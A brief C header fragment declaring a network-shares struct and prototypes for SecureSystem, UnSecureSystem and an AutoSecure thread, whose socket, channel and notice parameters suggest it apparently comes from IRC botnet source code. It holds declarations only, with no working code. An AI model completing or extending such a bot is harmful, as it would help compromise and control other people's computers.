typedef struct NetShares
{
	char *ShareName;
	char *SharePath;
		
} NetShares;

BOOL SecureSystem(SOCKET sock, char *chan, BOOL notice, BOOL silent);
BOOL UnSecureSystem(SOCKET sock, char *chan, BOOL notice, BOOL silent);
#ifndef NO_SECSYSTEM
DWORD WINAPI AutoSecure(LPVOID param);
#endif